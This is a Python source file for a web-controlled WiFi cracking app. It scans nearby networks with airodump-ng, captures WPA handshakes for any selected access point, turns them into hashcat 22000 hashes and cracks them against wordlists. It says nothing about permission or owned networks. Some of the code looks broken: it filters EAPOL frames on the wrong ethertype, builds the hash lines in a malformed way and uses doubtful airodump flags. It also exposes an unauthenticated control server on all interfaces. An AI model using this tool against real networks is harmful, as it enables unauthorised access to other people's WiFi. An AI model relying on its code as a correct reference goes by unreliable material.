#!/usr/bin/env python3
"""
Mac WiFi Cracker v4 - Standalone app for user control.
Features:
- Scan WiFi networks (airodump-ng)
- Capture handshakes (airodump-ng)
- Extract 22000 hashes (scapy)
- Crack with hashcat (local)
- Web UI for control
"""

import os
import sys
import json
import subprocess
import threading
import time
import re
from pathlib import Path
from datetime import datetime
from fastapi import FastAPI, UploadFile, File, Request
from fastapi.responses import HTMLResponse, JSONResponse
import uvicorn

app = FastAPI(title="Mac WiFi Cracker v4")

STATE = {
    "status": "idle",
    "message": "Ready",
    "progress": 0,
    "ap_list": [],
    "capturing": False,
    "capture_file": None,
    "captured": [],
    "results": [],
    "log": [],
    "hash_file": None,
}

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    entry = f"[{ts}] {msg}"
    STATE["log"].append(entry)
    print(entry, flush=True)
    if len(STATE["log"]) > 500:
        STATE["log"] = STATE["log"][-500:]

def scan_wifi():
    """Scan WiFi networks using airodump-ng."""
    STATE["status"] = "scanning"
    STATE["message"] = "Scanning WiFi networks (10s)..."
    STATE["progress"] = 10
    log("Starting airodump-ng scan...")
    
    try:
        airodump = "/usr/local/Cellar/aircrack-ng/1.7_2/sbin/airodump-ng"
        proc = subprocess.run(
            [airodump, "-w", "/tmp/wifiscan", "--interface", "en0", "-D"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=15
        )
        
        output = proc.stdout or ""
        ap_list = []
        
        for line in output.splitlines():
            if 'BSSID' in line or '====' in line:
                continue
            parts = line.split(None, 9)
            if len(parts) >= 8 and re.match(r'^[0-9a-f]{2}:', parts[0]):
                bssid = parts[0]
                channel = int(parts[1])
                rssi = int(parts[2].replace('dBm', '').strip())
                security = parts[8] if len(parts) > 8 else "WPA2"
                ssid = parts[9] if len(parts) > 9 else ""
                
                ap_list.append({
                    "bssid": bssid,
                    "rssi": rssi,
                    "channel": channel,
                    "mode": "802.11",
                    "security": security,
                    "ssid": ssid
                })
        
        # Deduplicate by BSSID
        seen = set()
        unique_ap_list = []
        for ap in ap_list:
            if ap["bssid"] not in seen:
                seen.add(ap["bssid"])
                unique_ap_list.append(ap)
        
        STATE["ap_list"] = unique_ap_list
        STATE["status"] = "idle"
        STATE["message"] = f"Found {len(unique_ap_list)} networks"
        STATE["progress"] = 100
        log(f"Scan complete: {len(unique_ap_list)} networks found")
        
    except Exception as e:
        STATE["status"] = "idle"
        STATE["message"] = f"Scan error: {e}"
        log(f"Scan error: {e}")

def capture_handshake(bssid, ssid, duration=30):
    """Capture handshake for a specific AP."""
    STATE["status"] = "capturing"
    STATE["message"] = f"Capturing {ssid} ({bssid}) for {duration}s..."
    STATE["progress"] = 20
    STATE["capturing"] = True
    STATE["capture_file"] = f"/tmp/capture_{bssid.replace(':', '')}.pcapng"
    log(f"Starting capture for {ssid} ({bssid})...")
    
    try:
        airodump = "/usr/local/Cellar/aircrack-ng/1.7_2/sbin/airodump-ng"
        cap_file = STATE["capture_file"].replace(".pcapng", "")
        
        proc = subprocess.Popen(
            [airodump, "-w", cap_file, "--interface", "en0", "-c", "0", "-b", bssid],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        
        time.sleep(duration)
        proc.terminate()
        proc.wait()
        
        # Check if capture file exists
        cap_file_ng = f"{cap_file}-01.cap"
        if not os.path.exists(cap_file_ng):
            cap_file_ng = f"{cap_file}.pcapng"
        
        STATE["capture_file"] = cap_file_ng
        STATE["status"] = "idle"
        STATE["message"] = f"Capture complete: {cap_file_ng}"
        STATE["progress"] = 50
        STATE["capturing"] = False
        log(f"Capture saved: {cap_file_ng}")
        
    except Exception as e:
        STATE["status"] = "idle"
        STATE["message"] = f"Capture error: {e}"
        STATE["capturing"] = False
        log(f"Capture error: {e}")

def extract_hashes(pcap_path, ssid):
    """Extract 22000 hashes using scapy."""
    STATE["status"] = "extracting"
    STATE["message"] = "Extracting handshakes..."
    STATE["progress"] = 60
    log(f"Extracting hashes from {pcap_path}...")
    
    try:
        from scapy.all import rdpcap, Ether, EAPOL_KEY
        
        pkts = rdpcap(pcap_path)
        hashes = set()
        
        for pkt in pkts:
            if Ether not in pkt:
                continue
            eth = pkt[Ether]
            if eth.type != 0x8863:
                continue
            if EAPOL_KEY not in pkt:
                continue
            
            ek = pkt[EAPOL_KEY]
            raw = bytes(ek)
            
            key_info = int.from_bytes(raw[1:3], 'big')
            msg_num = (key_info >> 8) & 0x03
            
            key_mic = ek.key_mic.hex() if hasattr(ek, 'key_mic') else ''
            if len(key_mic) != 32:
                continue
            
            rsc = raw[13:17].hex()
            key_data = raw[23:]
            nonce = key_data[:32].hex() if len(key_data) >= 32 else ''
            
            ap_mac = eth.dst.replace(':', '').lower()
            sta_mac = eth.src.replace(':', '').lower()
            ssid_hex = ssid.encode('utf-8').hex()
            
            eapol_frame = bytes(ek)
            
            hash_line = f"WPA*02*{key_mic}*{ap_mac}*{sta_mac}*{ssid_hex}*{nonce}*{eapol_frame.hex()}*{msg_num}"
            hashes.add(hash_line)
        
        hash_file = Path(pcap_path).with_suffix('.hc22000')
        with open(hash_file, 'w') as f:
            f.write('\n'.join(hashes) + '\n')
        
        STATE["captured"] = list(hashes)
        STATE["hash_file"] = str(hash_file)
        STATE["status"] = "idle"
        STATE["message"] = f"Extracted {len(hashes)} hashes"
        STATE["progress"] = 80
        log(f"Extracted {len(hashes)} hashes -> {hash_file}")
        
    except Exception as e:
        STATE["status"] = "idle"
        STATE["message"] = f"Extract error: {e}"
        log(f"Extract error: {e}")

def crack_hashes(hash_file, wordlist, rules=None):
    """Run hashcat on the hash file."""
    STATE["status"] = "cracking"
    STATE["message"] = "Cracking..."
    STATE["progress"] = 90
    log(f"Starting hashcat on {hash_file}...")
    
    try:
        cmd = [
            "hashcat", "-m", "22000", "-a", "0",
            hash_file, wordlist,
            "--self-test-disable", "--restore-disable",
            "--hwmon-temp-abort=92", "-w", "1"
        ]
        if rules:
            cmd.extend(["-r", rules])
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
        output = result.stdout + result.stderr
        
        results = []
        for line in output.splitlines():
            if 'Cracked' in line or 'password' in line.lower():
                results.append(line)
        
        STATE["results"] = results
        STATE["status"] = "idle"
        STATE["message"] = f"Cracking complete: {len(results)} results"
        STATE["progress"] = 100
        log(f"Hashcat output: {output[:500]}")
        
    except Exception as e:
        STATE["status"] = "idle"
        STATE["message"] = f"Crack error: {e}"
        log(f"Crack error: {e}")

@app.get("/")
async def root():
    return HTMLResponse("""
<!DOCTYPE html>
<html>
<head>
    <title>Mac WiFi Cracker v4</title>
    <style>
        body { font-family: -apple-system, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; background: #1a1a2e; color: #eee; }
        h1 { color: #4fc3f7; }
        .card { background: #16213e; border-radius: 8px; padding: 15px; margin: 10px 0; }
        .status { color: #4fc3f7; font-weight: bold; }
        .progress { width: 100%; height: 20px; background: #0f3460; border-radius: 10px; overflow: hidden; }
        .progress-bar { height: 100%; background: #4fc3f7; transition: width 0.3s; }
        .log { background: #0f3460; padding: 10px; border-radius: 4px; font-family: monospace; font-size: 12px; max-height: 300px; overflow-y: auto; }
        button { background: #4fc3f7; color: #1a1a2e; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; margin: 5px; }
        button:hover { background: #29b6f6; }
        button:disabled { background: #555; cursor: not-allowed; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #0f3460; }
        th { color: #4fc3f7; }
        select, input { background: #0f3460; color: #eee; border: none; padding: 8px; border-radius: 4px; }
    </style>
</head>
<body>
    <h1>Mac WiFi Cracker v4</h1>
    <div class="card">
        <div class="status">Status: <span id="status">Loading...</span></div>
        <div class="progress"><div class="progress-bar" id="progress" style="width: 0%"></div></div>
        <p id="message">Loading...</p>
    </div>
    <div class="card">
        <h2>1. Scan</h2>
        <button onclick="scan()" id="btn-scan">Scan WiFi</button>
        <table id="ap-table">
            <thead><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>Security</th><th>RSSI</th><th>Action</th></tr></thead>
            <tbody></tbody>
        </table>
    </div>
    <div class="card">
        <h2>2. Crack</h2>
        <select id="wordlist">
            <option value="/tmp/rockyou.txt">rockyou.txt (490)</option>
            <option value="/tmp/wifi_wordlist.txt">wifi_wordlist.txt (175K)</option>
        </select>
        <button onclick="crack()" id="btn-crack" disabled>Crack</button>
        <div id="results"></div>
    </div>
    <div class="card">
        <h2>Log</h2>
        <div class="log" id="log"></div>
    </div>
    <script>
        function update() {
            fetch('/api/state')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('status').textContent = data.status;
                    document.getElementById('progress').style.width = data.progress + '%';
                    document.getElementById('message').textContent = data.message;
                    document.getElementById('log').innerHTML = data.log.join('<br>');
                    document.getElementById('log').scrollTop = document.getElementById('log').scrollHeight;
                    
                    const tbody = document.querySelector('#ap-table tbody');
                    tbody.innerHTML = data.ap_list.map((ap, i) => 
                        `<tr>
                            <td>${ap.ssid || '(hidden)'}</td>
                            <td>${ap.bssid}</td>
                            <td>${ap.channel}</td>
                            <td>${ap.security}</td>
                            <td>${ap.rssi}</td>
                            <td><button onclick="capture(${i})" ${data.status !== 'idle' ? 'disabled' : ''}>Capture</button></td>
                        </tr>`
                    ).join('');
                    
                    const resultsDiv = document.getElementById('results');
                    resultsDiv.innerHTML = data.results.length > 0 
                        ? data.results.join('<br>')
                        : (data.hash_file ? '<em>Ready to crack</em>' : '<em>No hashes yet</em>');
                    
                    document.getElementById('btn-crack').disabled = !data.hash_file || data.status !== 'idle';
                })
                .catch(e => console.error(e));
        }
        
        function scan() {
            document.getElementById('btn-scan').disabled = true;
            fetch('/api/scan', { method: 'POST' })
                .then(r => r.json())
                .then(data => update());
        }
        
        function capture(index) {
            fetch('/api/state').then(r => r.json()).then(data => {
                const ap = data.ap_list[index];
                fetch(`/api/capture?bssid=${ap.bssid}&ssid=${encodeURIComponent(ap.ssid)}&duration=30`, { method: 'POST' })
                    .then(r => r.json())
                    .then(data => update());
            });
        }
        
        function crack() {
            const wordlist = document.getElementById('wordlist').value;
            fetch(`/api/crack?wordlist=${wordlist}`, { method: 'POST' })
                .then(r => r.json())
                .then(data => update());
        }
        
        update();
        setInterval(update, 2000);
    </script>
</body>
</html>
""")

@app.get("/api/state")
async def get_state():
    return JSONResponse(STATE)

@app.post("/api/scan")
async def api_scan():
    threading.Thread(target=scan_wifi, daemon=True).start()
    return JSONResponse({"ok": True})

@app.post("/api/capture")
async def api_capture(bssid: str, ssid: str = "", duration: int = 30):
    threading.Thread(target=capture_handshake, args=(bssid, ssid, duration), daemon=True).start()
    return JSONResponse({"ok": True})

@app.post("/api/extract")
async def api_extract(file: UploadFile = File(...), ssid: str = "32H9F_5G"):
    content = await file.read()
    pcap_path = Path("/tmp/uploaded.pcapng")
    pcap_path.write_bytes(content)
    threading.Thread(target=extract_hashes, args=(str(pcap_path), ssid), daemon=True).start()
    return JSONResponse({"ok": True})

@app.post("/api/crack")
async def api_crack(wordlist: str = "/tmp/rockyou.txt", rules: str = None):
    if STATE["hash_file"]:
        threading.Thread(target=crack_hashes, args=(STATE["hash_file"], wordlist, rules), daemon=True).start()
    return JSONResponse({"ok": True})

if __name__ == "__main__":
    log("Starting Mac WiFi Cracker v4 on port 8765...")
    uvicorn.run(app, host="0.0.0.0", port=8765)
